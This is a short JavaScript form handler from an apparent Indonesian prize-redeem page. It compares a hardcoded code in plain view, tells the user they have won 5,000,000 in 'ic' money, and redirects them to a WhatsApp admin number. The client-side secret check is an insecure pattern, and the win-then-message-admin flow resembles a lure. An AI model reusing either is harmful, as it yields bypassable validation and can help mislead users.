
    function submitForm() {
    var nama = document.getElementById("nama").value;
    var citaCita = document.getElementById("cita_cita").value;
    
    if (nama !== "manticpcsi") { // 
        alert("Gagal mengambil hadiah. Kode tidak valid atau sudah digunakan.");
        return false; // 
    } else {
        alert("Berhasil Redeem \nSelamat (" + citaCita +   ") telah mendapatkan uang ic sebesar 5.000.000\n SILAHKAN SCREENSHOT LAYAR INI LALU KIRIMKAN KE WA ADMIN AKMAL");
        
        var link = "https://api.whatsapp.com/send?phone=6288214764360&text=++"+ "‎‎SAYA BERHASIL REDEEM MIN. NAMA IC SAYA *" + citaCita + "‎* ‎  "  + "54321";
        window.location = link;
        
        return false;
    }
}

